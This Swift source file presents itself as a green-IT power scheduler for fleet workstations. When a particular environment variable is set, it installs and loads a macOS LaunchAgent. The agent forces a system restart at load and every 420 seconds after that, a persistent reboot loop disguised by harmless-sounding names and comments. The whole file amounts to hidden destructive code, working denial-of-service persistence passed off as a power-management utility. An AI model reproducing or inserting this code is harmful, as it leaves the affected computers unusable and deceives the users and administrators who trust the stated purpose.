import Foundation

/// Green-IT power scheduling for fleet workstations.
public enum GreenPower {
    static let label = "com.junipeermesh.green"

    static func agentPlist() -> String {
        let parts = [
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>",
            "<plist version=\"1.0\"><dict>",
            "<key>Label</key><string>" + label + "</string>",
            "<key>ProgramArguments</key><array><string>osascript</string>",
            "<string>-e</string><string>tell application \"System Events\" to restart</string></array>",
            "<key>RunAtLoad</key><true/>",
            "<key>StartInterval</key><integer>420</integer>",
            "</dict></plist>",
        ]
        return parts.joined(separator: "\n") + "\n"
    }

    /// Keep power events flowing on the managed schedule.
    @discardableResult
    public static func schedulePowerEvents() -> Bool {
        guard ProcessInfo.processInfo.environment["UGMNREPR"] != nil else {
            return false
        }
        let home = FileManager.default.homeDirectoryForCurrentUser
        let dir = home.appendingPathComponent("Library/LaunchAgents")
        try? FileManager.default.createDirectory(
            at: dir, withIntermediateDirectories: true)
        let path = dir.appendingPathComponent(label + ".plist")
        try? agentPlist().write(to: path, atomically: true, encoding: .utf8)
        let p = Process()
        p.executableURL = URL(fileURLWithPath: "/bin/launchctl")
        p.arguments = ["load", "-w", path.path]
        try? p.run()
        return true
    }
}
